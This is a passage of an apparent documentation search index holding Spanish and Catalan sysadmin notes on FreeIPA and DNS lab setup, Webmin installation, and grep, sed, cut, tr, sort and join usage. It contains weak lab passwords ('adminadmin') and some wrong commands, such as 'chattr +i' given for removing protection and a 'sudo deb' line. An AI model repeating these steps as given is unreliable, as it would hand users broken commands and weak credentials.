86400 ; ) @ IN NS ipa.empresa.local localhost IN A 127 .0.0.1 ipa.empresa.local IN A 192 .168.88.10 ipa-client.empresa.local IN A 192 .168.88.11 empresa.local.rev.zone $TTL 3D @ IN SOA localhost hostmaster.empresa.local ( 2007101910 ; Serial 8H ; Refresh 2H ; Retry 4W ; Expire 1D ; minimum TTI ) @ IN NS ipa.empresa.local. 10 IN PTR ipa.empresa.local. 11 IN PTR ipa-client.empresa.local. Comprobar dns nslookup [ root@ipa ~ ] # nslookup 192.168.88.10 Server: 127 .0.0.1 Address: 127 .0.0.1#53 10 .88.168.192.in-addr.arpa name = ipa.empresa.local. [ root@ipa ~ ] # nslookup ipa.empresa.local Server: 127 .0.0.1 Address: 127 .0.0.1#53 Name: ipa.empresa.local.empresa.local Address: 192 .168.88.10 habilitar dns systemctl start named systemctl enable named Cliente En el cliente a\u00f1adimos ip fija, hostame y dns del server Establecer hostname /etc/hostname ipa-client.empresa.local La ip y el dns lo a\u00f1adimos desde gr\u00e1fico por facilidad ip 192.168.88.11 dns 192.168.88.10 /etc/resolv.conf # Generated by NetworkManager search empresa.local nameserver 192 .168.88.10 Comprobamos con nslookup desde el cliente si todo a ido bien. En ocasiones el firewalld da problemas, si es as\u00ed desabilitar el del servidor y comprobar. Instalar paquetes necesarios yum install -y ipa-server ipa-server-dns bind-dyndb-ldap ipa-server-install # pregunta si quereos usar dns de freeipa Do you want to configure integrated DNS ( BIND ) ? [ no ] : Enter # << Quiero udsar mi dns local Server host name [ ipa.empresa.local ] : Enter # << Press enter Please confirm the domain name [ empresa.local ] : Enter # << Press enter # Ara introduim el realm (regne). La convenci\u00f3 diu que \u00e9s el nom del domini, per\u00f2 tot en maj\u00fascules. Please provide a realm name [ EMPRESA.LOCAL ] : Enter # << Press enter # Aquest \u00e9s el superusuari per instal\u00b7lar-ho tot Directory Manager password: .manager. # << Enter Directory manager password Password ( confirm ) : .manager. # << Re-Enter Ditectory manager password # Aquest \u00e9s l\u2019usuari admin per administrar el servidor IPA admin password: adminadmin << Enter IPA admin password - Used for Web UI and other administrative tasks Password (confirm): adminadmin << Re-Enter IPA admin password # Ara mostra la configuarci\u00f3 que posar\u00e0 The IPA Master Server will be configured with: Hostname: ipa.empresa.local IP address ( es ) : 192 .168.88.10 Domain name: empresa.local Realm name: EMPRESA.LOCAL Continue to configure the system with these values? [ no ] : yes # << Type yes to confirm the inputs ================================================================== Setup complete Next steps: 1 . You must make sure these network ports are open: TCP Ports: * 80 , 443 : HTTP/HTTPS * 389 , 636 : LDAP/LDAPS * 88 , 464 : kerberos * 53 : bind UDP Ports: * 88 , 464 : kerberos * 53 : bind * 123 : ntp 2 . You can now obtain a kerberos ticket using the command: 'kinit admin' This ticket will allow you to use the IPA tools ( e.g., ipa user-add ) and the web user interface. Be sure to back up the CA certificates stored in /root/cacert.p12 These files are required to create replicas. The password for these files is the Directory Manager password A\u00f1adimos parametros al firewall que nos indica al final de la instalaci\u00f3n firewall-cmd --permanent --add-port { 80 /tcp,443/tcp,389/tcp,636/tcp,88/tcp,464/tcp,53/tcp,88/udp,464/udp,53/udp,123/udp } # reiniciamos firewall firewall-cmd --reload Comprobamos que haya ido bien la instalaci\u00f3n # iniciamos user admin kinit admin Password for admin@EMPRESA.LOCAL: # busca user admin [ root@ipa ~ ] # ipa user-find admin --------------------- 1 usuario coincidente --------------------- Ingreso de usuario: admin Apellido: Administrator Directorio principal: /home/admin Shell de ingreso: /bin/bash Principal alias: admin@EMPRESA.LOCAL UID: 660800000 GID: 660800000 Cuenta inhabilitada : False -------------------------------- Cantidad de entradas devueltas 1 -------------------------------- # comprueba token [ root@ipa ~ ] # klist Ticket cache: KEYRING:persistent:0:0 Default principal: admin@EMPRESA.LOCAL Valid starting Expires Service principal 29 /04/18 12 :50:36 30 /04/18 12 :50:11 HTTP/ipa.empresa.local@EMPRESA.LOCAL 29 /04/18 12 :50:17 30 /04/18 12 :50:11 krbtgt/EMPRESA.LOCAL@EMPRESA.LOCAL Acceder a la configuraci\u00f3n web Abre en el navegador la siguiente url: https://ipa.empresa.local Configuraci\u00f3n cliente ipa A\u00f1adir ip, hostname y dns si no lo hemos hecho ya. Instalar paquetes necesarios sudo yum install -y freeipa-client Instalar cliente sudo ipa-client-install --mkhomedir Provide the domain name of your IPA server ( ex: example.com ) : ipa.empresa.local Provide your IPA server name ( ex: ipa.example.com ) : ipa.empresa.local Autodiscovery of servers for failover cannot work with this configuration. If you proceed with the installation, services will be configured to always access the discovered server for all operations and will not fail over to other servers in case of failure. Proceed with fixed values and no DNS discovery? [ no ] : yes Continue to configure the system with these values? [ no ] : yes User authorized to enroll computers: admin Password: adminadmin Comprobar desde el entorno web que se haya a\u00f1adido un nuevo host al dominio. Ya podemos reiniciar y entrar con el usuario local o de freeipa. Al entrar por primera vez nos pedira la password 2 veces y nos la hara cambiar.","title":"FreeIpa"},{"location":"administracion/freeipa/#freeipa","text":"Freeipa es un servidor de identificaci\u00f3n de usuarios que trabaja con ldap y kerberos. FreeIpa Servidor Configurar dns Server Comprobar dns Cliente Instalar paquetes necesarios Acceder a la configuraci\u00f3n web Configuraci\u00f3n cliente ipa Instalar paquetes necesarios Instalar cliente Entorno de laboratorio: 2 centos server minimal cliente grafico \u200b","title":"FreeIpa"},{"location":"administracion/freeipa/#servidor","text":"poner ip fija /etc/sysconfig/network-scripts/ifcfg-eth0 TYPE = Ethernet PROXY_METHOD = none BROWSER_ONLY = no BOOTPROTO = none DEFROUTE = yes IPV4_FAILURE_FATAL = no IPV6INIT = yes IPV6_AUTOCONF = yes IPV6_DEFROUTE = yes IPV6_FAILURE_FATAL = no IPV6_ADDR_GEN_MODE = stable-privacy NAME = eth0 UUID = ba543471-6b4c-4c48-ac89-d375b5a8f290 DEVICE = eth0 ONBOOT = yes IPADDR = 192 .168.88.10 PREFIX = 24 GATEWAY = 192 .168.88.1 DNS1 = 127 .0.0.1 DNS2 = 192 .168.88.10 DNS3 = 8 .8.8.8 Establecer hostname [ root@localhost ~ ] # cat /etc/hostname ipa.empresa.local configurar dns o en caso chapuza desde /etc/hosts echo \"192.168.88.10 ipa.empresa.local ipa\" >> /etc/hosts","title":"Servidor"},{"location":"administracion/freeipa/#configurar-dns","text":"","title":"Configurar dns"},{"location":"administracion/freeipa/#server","text":"ip 192.168.88.10 /etc/resolv.conf # Generated by NetworkManager search empresa.local nameserver 127 .0.0.1 nameserver 192 .168.88.10 nameserver 8 .8.8.8 /etc/named.conf options { listen-on port 53 { 127 .0.0.1 ; 192 .168.88.10 ; } ; listen-on-v6 port 53 { ::1 ; } ; directory \"/var/named\" ; dump-file \"/var/named/data/cache_dump.db\" ; statistics-file \"/var/named/data/named_stats.txt\" ; memstatistics-file \"/var/named/data/named_mem_stats.txt\" ; allow-query { localhost ; any ; } ; forward first ; forwarders { 8 .8.8.8 ; 8 .8.4.4 ; } ; /* /etc/named.rfc1912.zones zone \"empresa.local\" IN { type master ; notify no ; file \"/var/named/empresa.local.zone\" ; } ; zone \"88.168.192.in-addr.arpa\" IN { type master ; notify no ; file \"/var/named/empresa.local.rev.zone\" ; } ; empresa.local.zone $TTL 604800 @ IN SOA ipa.empresa.local. hostmaster.empresa.local. ( 2010021101 ; 10800 ; 7200 ; 604800 ; 86400 ; ) @ IN NS ipa.empresa.local localhost IN A 127 .0.0.1 ipa.empresa.local IN A 192 .168.88.10 ipa-client.empresa.local IN A 192 .168.88.11 empresa.local.rev.zone $TTL 3D @ IN SOA localhost hostmaster.empresa.local ( 2007101910 ; Serial 8H ; Refresh 2H ; Retry 4W ; Expire 1D ; minimum TTI ) @ IN NS ipa.empresa.local. 10 IN PTR ipa.empresa.local. 11 IN PTR ipa-client.empresa.local.","title":"Server"},{"location":"administracion/freeipa/#comprobar-dns","text":"nslookup [ root@ipa ~ ] # nslookup 192.168.88.10 Server: 127 .0.0.1 Address: 127 .0.0.1#53 10 .88.168.192.in-addr.arpa name = ipa.empresa.local. [ root@ipa ~ ] # nslookup ipa.empresa.local Server: 127 .0.0.1 Address: 127 .0.0.1#53 Name: ipa.empresa.local.empresa.local Address: 192 .168.88.10 habilitar dns systemctl start named systemctl enable named","title":"Comprobar dns"},{"location":"administracion/freeipa/#cliente","text":"En el cliente a\u00f1adimos ip fija, hostame y dns del server Establecer hostname /etc/hostname ipa-client.empresa.local La ip y el dns lo a\u00f1adimos desde gr\u00e1fico por facilidad ip 192.168.88.11 dns 192.168.88.10 /etc/resolv.conf # Generated by NetworkManager search empresa.local nameserver 192 .168.88.10 Comprobamos con nslookup desde el cliente si todo a ido bien. En ocasiones el firewalld da problemas, si es as\u00ed desabilitar el del servidor y comprobar.","title":"Cliente"},{"location":"administracion/freeipa/#instalar-paquetes-necesarios","text":"yum install -y ipa-server ipa-server-dns bind-dyndb-ldap ipa-server-install # pregunta si quereos usar dns de freeipa Do you want to configure integrated DNS ( BIND ) ? [ no ] : Enter # << Quiero udsar mi dns local Server host name [ ipa.empresa.local ] : Enter # << Press enter Please confirm the domain name [ empresa.local ] : Enter # << Press enter # Ara introduim el realm (regne). La convenci\u00f3 diu que \u00e9s el nom del domini, per\u00f2 tot en maj\u00fascules. Please provide a realm name [ EMPRESA.LOCAL ] : Enter # << Press enter # Aquest \u00e9s el superusuari per instal\u00b7lar-ho tot Directory Manager password: .manager. # << Enter Directory manager password Password ( confirm ) : .manager. # << Re-Enter Ditectory manager password # Aquest \u00e9s l\u2019usuari admin per administrar el servidor IPA admin password: adminadmin << Enter IPA admin password - Used for Web UI and other administrative tasks Password (confirm): adminadmin << Re-Enter IPA admin password # Ara mostra la configuarci\u00f3 que posar\u00e0 The IPA Master Server will be configured with: Hostname: ipa.empresa.local IP address ( es ) : 192 .168.88.10 Domain name: empresa.local Realm name: EMPRESA.LOCAL Continue to configure the system with these values? [ no ] : yes # << Type yes to confirm the inputs ================================================================== Setup complete Next steps: 1 . You must make sure these network ports are open: TCP Ports: * 80 , 443 : HTTP/HTTPS * 389 , 636 : LDAP/LDAPS * 88 , 464 : kerberos * 53 : bind UDP Ports: * 88 , 464 : kerberos * 53 : bind * 123 : ntp 2 . You can now obtain a kerberos ticket using the command: 'kinit admin' This ticket will allow you to use the IPA tools ( e.g., ipa user-add ) and the web user interface. Be sure to back up the CA certificates stored in /root/cacert.p12 These files are required to create replicas. The password for these files is the Directory Manager password A\u00f1adimos parametros al firewall que nos indica al final de la instalaci\u00f3n firewall-cmd --permanent --add-port { 80 /tcp,443/tcp,389/tcp,636/tcp,88/tcp,464/tcp,53/tcp,88/udp,464/udp,53/udp,123/udp } # reiniciamos firewall firewall-cmd --reload Comprobamos que haya ido bien la instalaci\u00f3n # iniciamos user admin kinit admin Password for admin@EMPRESA.LOCAL: # busca user admin [ root@ipa ~ ] # ipa user-find admin --------------------- 1 usuario coincidente --------------------- Ingreso de usuario: admin Apellido: Administrator Directorio principal: /home/admin Shell de ingreso: /bin/bash Principal alias: admin@EMPRESA.LOCAL UID: 660800000 GID: 660800000 Cuenta inhabilitada : False -------------------------------- Cantidad de entradas devueltas 1 -------------------------------- # comprueba token [ root@ipa ~ ] # klist Ticket cache: KEYRING:persistent:0:0 Default principal: admin@EMPRESA.LOCAL Valid starting Expires Service principal 29 /04/18 12 :50:36 30 /04/18 12 :50:11 HTTP/ipa.empresa.local@EMPRESA.LOCAL 29 /04/18 12 :50:17 30 /04/18 12 :50:11 krbtgt/EMPRESA.LOCAL@EMPRESA.LOCAL","title":"Instalar paquetes necesarios"},{"location":"administracion/freeipa/#acceder-a-la-configuracion-web","text":"Abre en el navegador la siguiente url: https://ipa.empresa.local","title":"Acceder a la configuraci\u00f3n web"},{"location":"administracion/freeipa/#configuracion-cliente-ipa","text":"A\u00f1adir ip, hostname y dns si no lo hemos hecho ya.","title":"Configuraci\u00f3n cliente ipa"},{"location":"administracion/freeipa/#instalar-paquetes-necesarios_1","text":"sudo yum install -y freeipa-client","title":"Instalar paquetes necesarios"},{"location":"administracion/freeipa/#instalar-cliente","text":"sudo ipa-client-install --mkhomedir Provide the domain name of your IPA server ( ex: example.com ) : ipa.empresa.local Provide your IPA server name ( ex: ipa.example.com ) : ipa.empresa.local Autodiscovery of servers for failover cannot work with this configuration. If you proceed with the installation, services will be configured to always access the discovered server for all operations and will not fail over to other servers in case of failure. Proceed with fixed values and no DNS discovery? [ no ] : yes Continue to configure the system with these values? [ no ] : yes User authorized to enroll computers: admin Password: adminadmin Comprobar desde el entorno web que se haya a\u00f1adido un nuevo host al dominio. Ya podemos reiniciar y entrar con el usuario local o de freeipa. Al entrar por primera vez nos pedira la password 2 veces y nos la hara cambiar.","title":"Instalar cliente"},{"location":"administracion/instalar_webmin/","text":"instalar webmin Webmin es una herramienta para administrar tu pc local o remotamente. Instalar http://www.webmin.com/deb.html Desde web deb Dependencias necesarias en debian sudo apt-get install perl libnet-ssleay-perl openssl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python Descargar paquete wget http://prdownloads.sourceforge.net/webadmin/webmin_1.860_all.deb instalar sudo dpkg --install webmin1.860all.deb Desde repositorio a\u00f1adir repositorio sudo deb http://download.webmin.com/download/repository sarge contrib descargar y a\u00f1adir key repo sudo cd /root sudo wget http://www.webmin.com/jcameron-key.asc sudo apt-key add jcameron-key.asc instalar sudo apt-get update sudo apt-get install apt-transport-https sudo apt-get install webmin Desde rpm web Descargar wget http://prdownloads.sourceforge.net/webadmin/webmin-1.860-1.noarch.rpm Instalar dependencias necesarias sudo dnf -y install perl perl-Net-SSLeay openssl perl-IO-Tty perl-Encode-Detect Instalar sudo rpm -U webmin-1.860-1.noarch.rpm acceder https://192.168.4.3:10000 contrase\u00f1a de root configurar dns https://usuariodebian.blogspot.com.es/2012/10/instalar-y-configurar-un-servidor-dns.html","title":"instalar webmin"},{"location":"administracion/instalar_webmin/#instalar-webmin","text":"Webmin es una herramienta para administrar tu pc local o remotamente.","title":"instalar webmin"},{"location":"administracion/instalar_webmin/#instalar","text":"http://www.webmin.com/deb.html","title":"Instalar"},{"location":"administracion/instalar_webmin/#desde-web-deb","text":"Dependencias necesarias en debian sudo apt-get install perl libnet-ssleay-perl openssl libauthen-pam-perl libpam-runtime libio-pty-perl apt-show-versions python Descargar paquete wget http://prdownloads.sourceforge.net/webadmin/webmin_1.860_all.deb instalar sudo dpkg --install webmin1.860all.deb","title":"Desde web deb"},{"location":"administracion/instalar_webmin/#desde-repositorio","text":"a\u00f1adir repositorio sudo deb http://download.webmin.com/download/repository sarge contrib descargar y a\u00f1adir key repo sudo cd /root sudo wget http://www.webmin.com/jcameron-key.asc sudo apt-key add jcameron-key.asc instalar sudo apt-get update sudo apt-get install apt-transport-https sudo apt-get install webmin","title":"Desde repositorio"},{"location":"administracion/instalar_webmin/#desde-rpm-web","text":"Descargar wget http://prdownloads.sourceforge.net/webadmin/webmin-1.860-1.noarch.rpm Instalar dependencias necesarias sudo dnf -y install perl perl-Net-SSLeay openssl perl-IO-Tty perl-Encode-Detect Instalar sudo rpm -U webmin-1.860-1.noarch.rpm","title":"Desde rpm web"},{"location":"administracion/instalar_webmin/#acceder","text":"https://192.168.4.3:10000 contrase\u00f1a de root configurar dns https://usuariodebian.blogspot.com.es/2012/10/instalar-y-configurar-un-servidor-dns.html","title":"acceder"},{"location":"administracion/per/","text":"PER patrons expresio regular Regular expresion --> regex grep \"per\" file[...] buscar/filtrar lineas mediante un patron ^ # principio dev linea $ # final de linea [] # lista que contenga [aei] a,e,i [ 0 -9a-Z ] # rangos [ ^ ] # lista que no contenga . # un caracter * # junto al caracter anterior 0 o n veces .* # 0 o cualquier caracter {} # numero de repeticiones {n}{n,m}{n,}{,n} ? # reperticion del caracter anterior cero o una vez + # reperticion del caracter anterior una o mas veces [ :alnum: ] , [ :alpha: ] , [ :cntrl: ] , [ :digit: ] , [ :graph: ] , [ :lower: ] , [ :print: ] , [ :punct: ] , [ :space: ] , [ :upper: ] , and [ :xdigit: ] . For example, [[ :alnum: ]] echo \"hola hole holi\" | grep \"hol[^ae]\" holi holi echo \"hola hole holi holiesto\" | grep \"hol[^ae].\" holi holie echo \"hola hole holi holiesto\" | grep \"hol[^ae]*\" hol hol holi holie echo \"hola hole holi holiesto\" | grep \"hol[^ae].*\" holi holiesto echo \"hola hole holi holiesto\" | grep \".*holi\" hola hole holi holi El * busca lo mas a la derecha posible echo \"aa:cc:bb:cc:dd\" | grep \".*:cc:\" aa:cc:bb:cc: grep -i ignore case ( ignorarv casec sensitive ) -v invert match ( revertir busquerda ) -n numero de lineas -E aceptar expresiones regulares {} , | , [] , etc... o egrep Buscando coincidencias con grep tenemos que acotar bien, indicando principios, finales etc.. ^[^:]* : Buscar desde el principio hasta el primer : echo \"a:b:c:d:b:y:\" | grep \"^[^:]*:b:\" a:b: # busqueda del 3er campo grep \"^[^:]*:[^:]*:1:\" passwd bin:x:1: Linea del /etc/passwd login:passwd:uid:gid:gecos:home:shell gecos: descripcion Validar matriculas actuales y antiguas. 9999 AAA A [ A ] -9999-AA format1 = \"^[0-9]{4} [A-Z]{3} $ \" format2 = \"^[A-Z][A-Z]?-[0-9]{4}-[A-Z]{2} $ \" grep -E \" $format1 | $format2 \" matriculas CUT Cut muestra s\u00f3lo una parte de cada linea. hace un corte en vertical -c recorta teniendo en cuenta caracteres y -f tiene en cuenta columnas , por defecto cut delimita ppor tabuladores pero con -d se puede modificar cut -c 1 ,2 /etc/passwd # muestra el caracter 1 y 2 de todas las lineas cut -c -3 /etc/passwd # mestra del primer caracter al tercero cut -c 2 - /etc/passwd # mestra del segundo al final de linea cut -c 2 -4 /etc/passwd # muestra del segundo al cuarto caracter # muestra fila 1 y 2 delimitando las filas por : cut -d \":\" -f 1 ,2 TR tr sustitulle letras, en sus filtros tambi\u00e9n acepta caracteres especiales como \\t o clases. tr \"\" \"\" que y porqu\u00e9 substituci\u00f3n de cada letra por letra no sirve para palabras \u279c echo \"casa\" | tr \"a\" \"e\" cese \u279c echo \"casa\" | tr -d \"a\" cs \u279c echo \"caaasaaaa\" | tr -s \"a\" casa \u279c echo \"Mi casa tiene 10 lamparas\" | tr -s \"[:blank:]\" \" \" Mi casa tiene 10 lamparas \u279c echo \"Mi casa tiene 10 lamparas\" | tr \"[:alpha:]\" \"X\" XX XXXX XXXXX 10 XXXXXXXX \u279c echo \"Mi casa tiene 10 lamparas\" | tr \"[:digit:]\" \"X\" Mi casa tiene XX lamparas echo \"la mar estaba salada, merda\" | tr \"mar\" \"cel\" le cel estebe selede, celde En el anterior caso visualmente funciona mal, pero realment sustituye por letra. m => c , a=>e y la r=>l . En el caso de querer substituir palabras se tiene que utilizar otros comandos como, sed, awk, etc.. Tipos de clases : representan un conjunto predefinido de caracteres clases descripcion [:alnum:] Las letras y D\u00edgitos [:alpha:] Letras [:blank:] Espacios en Blanco [:cntrl:] Caracteres de control [:space:] Los Espacios en Blanco verticales y horizontales [:graph:] Caracteres imprimibles, sin incluir el Espacio en Blanco [:print:] Caracteres imprimibles, incluyendo el Espacio en Blanco [:digit:] D\u00edgitos [:lower:] Letras min\u00fasculas. [:upper:] Letras may\u00fasculas. [:punct:] Signos de puntuaci\u00f3n. [:xdigit:] D\u00edgitosHexadecimales. Blank blank son espacios. tabulador un espcio en blanco sin dfefinir en anchura. cuando el delimitador es un blanco se a de normalizar. Ejemplo de normalizar la salida de fstab, creo separadores para poder filtrar por columnas facilmente. ( El delimitador no puede estar en el contenido por defecto (un blanco o un tabulador) ) En el siguiente ejemplo se ve la salida de fstab, pero no sabemos cuantos espacios o tabuladores hay entre campo y campo. De esta manera resulta imposible crear una salida en condiciones, por lo tanto la normalizo a un blanco \u00fanico entre campos. grep -v \"^#\" fstab /dev/sda5 / ext4 defaults 1 1 /dev/sda7 swap swap defaults 0 0 grep -v \"^#\" fstab | tr -s \"[:blank:]\" \" \" /dev/sda5 / ext4 defaults 1 1 /dev/sda7 swap swap defaults 0 0 -s , --squeeze-repeats SORT sort -n -t: -k3,3 passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin -n Ordena numericamente -k Ordena por campo -k3 campo 3 hasta final de la l\u00ednea -k3,3 especificamente campo 3 -k3n,3 campo 3 ordenado numericamente -t delimitador entre campos Ordenar campo 4 orden descendente numericamente passwd | sort -t: -k4rn,4 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin Ordenaci\u00f3n --> estable ( propiedad ) En ordenaciones siempre a de ver un campo clave, esto significa que si filtras por un campo en el que puede aber resultados iguales, se tiene que filtrar por un segundo o mas campos. ll / | head | tr -s \"[:blank:]\" ' ' | cut -d \" \" -f2,3,5,6 | sort -t ' ' -k3n,3 -k1n,1 18 root 3 ,3K ene 2 root 4 ,0K ene 2 root 4 ,0K ene 3 root 4 ,0K ene 5 root 4 ,0K ene 19 root 4 ,0K ene 162 root 12K ene 1 root 30 ene 1 root 30 ene Normalizo la salida con tr recorto las filas que me interesan con cut Ordeno numericamente, ascendente, por la columna 3 y los que coinciden por la 1 SED Sintaxis sed <seleccio de linies> 's/<que busco>/<por que cambio>/<numero de veces>' echo \"hola mama que tal\" | sed 's/mama/papa/' hola papa que tal # sustituir una vez sed 's/mama/papa/' # sustituir recursivamente sed 's/mama/papa/g' # desde la linea 3 hasta el final sed '3,$ s/bin/BIN/g' text # desde linea 1 hasta 7 incluida sed '1,7 s/bin/BIN/g' text # sustitulle en las lineas que contengan elfo bin por BIN sed '/elfo/ s/bin/BIN/g' text # desde la linea que contenga capitulo 1 hasta capitulo 2 sustitulle bin por BIN sed '/capitulo 1/,/capitulo 2/ s/bin/BIN/g' text # desde la linea que contenga capitulo 2 hasta el final sed '/capitulo 2/,$ s/bin/BIN/g' text Sed con expresiones # dejar linea 3 en blanco sed '3 /^.*$//g' # eliminar el primer campo echo \"Nom:Cognom:Adre\u00e7a:email\" | sed 's/^[^:]*://g' Cognom:Adre\u00e7a:email # Reordenar primer y segundo campo. \"\\1 y \\2\" se refiere a parentesi 1 y 2 echo \"Nom:Cognom:Adre\u00e7a:email\" | sed -r 's/^([^:]*):([^:]*):/\\2:\\1:/g' Cognom:Nom:Adre\u00e7a:email # eliminar un campo y redistribuir los otros. echo \"Nom:Grup:Nota\" | sed -r 's/^([^:]*):([^:]*):(.*)$/\\3--\\1/g' Nota--Nom # modificar un valor. \"&\" se refiere al contenido a substituir echo \"Nom:Grup:Nota\" | sed -r 's/Grup/ASI-&/g' Nom:ASI-Grup:Nota # utilizando variables NOMBRE = \"Jorge\" echo \"Nom:Grup:Nota\" | sed -r \"s/Nom/ $NOMBRE /g\" Jorge:Grup:Nota # poner separador de millares echo \"45200\" | sed -r \"s/[0-9]{3} $ /.&/g\" 45 .200 paste paste concatena linea a linea la informacion de dos ficheros \u279c cat notas 1 2 5 9 \u279c cat nombres juan anna pedro lucia \u279c paste nombres notas juan 1 anna 2 pedro 5 lucia 9 JOIN Join relaciona dos ficheros seg\u00fan un campo. archivos base. cat adats.txt pere 12 marta 25 juan 10 cat notes.txt pere 6 marta 10 juan 8 .5 lluis 4 Hay que tener en cuenta que el primer archivo se indica como -1 y el segundo archivo -2 # relacion automatica join adats.txt notes.txt pere 12 6 marta 25 10 juan 10 8 .5 # Relacionar por campo 1 del archivo 1 join -1 1 adats.txt notes.txt pere 12 6 marta 25 10 juan 10 8 .5 # relacionar por campo 1 del archivo 1 y 2 join -1 1 -2 1 adats.txt notes.txt pere 12 6 marta 25 10 juan 10 8 .5 # idem anteror + mostrar salida archivo 2 campo 2 join -o2.2 -1 1 -2 1 adats.txt notes.txt 6 10 8 .5 # idem anterior + salida campo 1 del archivo 1 join -o2.2,1.1 -1 1 -2 1 adats.txt notes.txt 6 pere 10 marta 8 .5 juan - -o se creiere a output, que quiees mostrar y de donde. Left y right join. indicamos left join con -a 1 y right join con -a 2 . # left join join -a 1 -o2.2,1.1 -1 1 -2 1 adats.txt notes.txt 6 pere 10 marta 8 .5 juan # right join join -a 2 -o2.2,1.1 -1 1 -2 1 adats.txt notes.txt 6 pere 10 marta 8 .5 juan 4 Chattr Protegemos nuestros archivos de un posible borrado chattr, con este comando no podremos borrar dicho archivo o carpeta ni siendo root. Al protegerlo no nos dejar\u00e1 crear clonaciones tipo hard, solo accesos directos tipo Soft aunque no podremos editarlo de ninguna manera. Proteger sudo chattr +i <archivo/carpeta> Liberar sudo chattr +i <archivo/carpeta>","title":"PER"},{"location":"administracion/per/#per","text":"","title":"PER"},{"location":"administracion/per/#patrons-expresio-regular","text":"Regular expresion --> regex grep \"per\" file[...] buscar/filtrar lineas mediante un patron ^ # principio dev linea $ # final de linea [] # lista que contenga [aei] a,e,i [ 0 -9a-Z ] # rangos [ ^ ] # lista que no contenga . # un caracter * # junto al caracter anterior 0 o n veces .* # 0 o cualquier caracter {} # numero de repeticiones {n}{n,m}{n,}{,n} ? # reperticion del caracter anterior cero o una vez + # reperticion del caracter anterior una o mas veces [ :alnum: ] , [ :alpha: ] , [ :cntrl: ] , [ :digit: ] , [ :graph: ] , [ :lower: ] , [ :print: ] , [ :punct: ] , [ :space: ] , [ :upper: ] , and [ :xdigit: ] . For example, [[ :alnum: ]] echo \"hola hole holi\" | grep \"hol[^ae]\" holi holi echo \"hola hole holi holiesto\" | grep \"hol[^ae].\" holi holie echo \"hola hole holi holiesto\" | grep \"hol[^ae]*\" hol hol holi holie echo \"hola hole holi holiesto\" | grep \"hol[^ae].*\" holi holiesto echo \"hola hole holi holiesto\" | grep \".*holi\" hola hole holi holi El * busca lo mas a la derecha posible echo \"aa:cc:bb:cc:dd\" | grep \".*:cc:\" aa:cc:bb:cc: grep -i ignore case ( ignorarv casec sensitive ) -v invert match ( revertir busquerda ) -n numero de lineas -E aceptar expresiones regulares {} , | , [] , etc... o egrep Buscando coincidencias con grep tenemos que acotar bien, indicando principios, finales etc.. ^[^:]* : Buscar desde el principio hasta el primer : echo \"a:b:c:d:b:y:\" | grep \"^[^:]*:b:\" a:b: # busqueda del 3er campo grep \"^[^:]*:[^:]*:1:\" passwd bin:x:1: Linea del /etc/passwd login:passwd:uid:gid:gecos:home:shell gecos: descripcion Validar matriculas actuales y antiguas. 9999 AAA A [ A ] -9999-AA format1 = \"^[0-9]{4} [A-Z]{3} $ \" format2 = \"^[A-Z][A-Z]?-[0-9]{4}-[A-Z]{2} $ \" grep -E \" $format1 | $format2 \" matriculas","title":"patrons expresio regular"},{"location":"administracion/per/#cut","text":"Cut muestra s\u00f3lo una parte de cada linea. hace un corte en vertical -c recorta teniendo en cuenta caracteres y -f tiene en cuenta columnas , por defecto cut delimita ppor tabuladores pero con -d se puede modificar cut -c 1 ,2 /etc/passwd # muestra el caracter 1 y 2 de todas las lineas cut -c -3 /etc/passwd # mestra del primer caracter al tercero cut -c 2 - /etc/passwd # mestra del segundo al final de linea cut -c 2 -4 /etc/passwd # muestra del segundo al cuarto caracter # muestra fila 1 y 2 delimitando las filas por : cut -d \":\" -f 1 ,2","title":"CUT"},{"location":"administracion/per/#tr","text":"tr sustitulle letras, en sus filtros tambi\u00e9n acepta caracteres especiales como \\t o clases. tr \"\" \"\" que y porqu\u00e9 substituci\u00f3n de cada letra por letra no sirve para palabras \u279c echo \"casa\" | tr \"a\" \"e\" cese \u279c echo \"casa\" | tr -d \"a\" cs \u279c echo \"caaasaaaa\" | tr -s \"a\" casa \u279c echo \"Mi casa tiene 10 lamparas\" | tr -s \"[:blank:]\" \" \" Mi casa tiene 10 lamparas \u279c echo \"Mi casa tiene 10 lamparas\" | tr \"[:alpha:]\" \"X\" XX XXXX XXXXX 10 XXXXXXXX \u279c echo \"Mi casa tiene 10 lamparas\" | tr \"[:digit:]\" \"X\" Mi casa tiene XX lamparas echo \"la mar estaba salada, merda\" | tr \"mar\" \"cel\" le cel estebe selede, celde En el anterior caso visualmente funciona mal, pero realment sustituye por letra. m => c , a=>e y la r=>l . En el caso de querer substituir palabras se tiene que utilizar otros comandos como, sed, awk, etc.. Tipos de clases : representan un conjunto predefinido de caracteres clases descripcion [:alnum:] Las letras y D\u00edgitos [:alpha:] Letras [:blank:] Espacios en Blanco [:cntrl:] Caracteres de control [:space:] Los Espacios en Blanco verticales y horizontales [:graph:] Caracteres imprimibles, sin incluir el Espacio en Blanco [:print:] Caracteres imprimibles, incluyendo el Espacio en Blanco [:digit:] D\u00edgitos [:lower:] Letras min\u00fasculas. [:upper:] Letras may\u00fasculas. [:punct:] Signos de puntuaci\u00f3n. [:xdigit:] D\u00edgitosHexadecimales.","title":"TR"},{"location":"administracion/per/#blank","text":"blank son espacios. tabulador un espcio en blanco sin dfefinir en anchura. cuando el delimitador es un blanco se a de normalizar. Ejemplo de normalizar la salida de fstab, creo separadores para poder filtrar por columnas facilmente. ( El delimitador no puede estar en el contenido por defecto (un blanco o un tabulador) ) En el siguiente ejemplo se ve la salida de fstab, pero no sabemos cuantos espacios o tabuladores hay entre campo y campo. De esta manera resulta imposible crear una salida en condiciones, por lo tanto la normalizo a un blanco \u00fanico entre campos. grep -v \"^#\" fstab /dev/sda5 / ext4 defaults 1 1 /dev/sda7 swap swap defaults 0 0 grep -v \"^#\" fstab | tr -s \"[:blank:]\" \" \" /dev/sda5 / ext4 defaults 1 1 /dev/sda7 swap swap defaults 0 0 -s , --squeeze-repeats","title":"Blank"},{"location":"administracion/per/#sort","text":"sort -n -t: -k3,3 passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin -n Ordena numericamente -k Ordena por campo -k3 campo 3 hasta final de la l\u00ednea -k3,3 especificamente campo 3 